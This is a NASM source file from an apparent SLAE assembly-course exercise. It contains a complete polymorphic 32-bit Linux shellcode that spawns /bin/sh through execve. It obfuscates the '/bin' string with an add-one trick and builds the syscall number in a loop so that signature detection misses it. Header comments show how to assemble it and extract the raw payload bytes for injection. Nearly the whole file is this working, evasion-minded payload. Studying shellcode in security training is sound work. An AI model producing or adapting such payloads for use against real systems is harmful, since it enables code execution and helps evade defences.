; Filename:      shellcode-polymorphic-asm.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  26.12.2018
; Assembler:     nasm -f elf32 shellcode-polymorphic-asm.nasm -o shellcode-polymorphic-asm.o
; Linker:        ld -N -m elf_i386 shellcode-polymorphic-asm.o -o shellcode-polymorphic-asm
; Assembly dump: objdump -d ./shellcode-polymorphic-asm|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

section .text

_start:

  xor ecx, ecx                ; Clear ecx register
  mov eax, ecx                ; Clear eax register
  mov cl, 0xb                 ; Set counter for loop
  push eax                    ; Push 0x00000000 to stack

repeat:
  inc eax                     ; increment eax till 0xb (polymorphic)
  loop repeat

  push 0x68732f2f             ; "hs//" 
  push 0x6d68612e             ; "nib/" with each bytes -1
  add dword [esp], 0x01010101 ; "nib/" add 1 to each bytes

  mov ebx,esp                 ; Store pointer to string in ebx
  int 0x80                    ; syscal execve
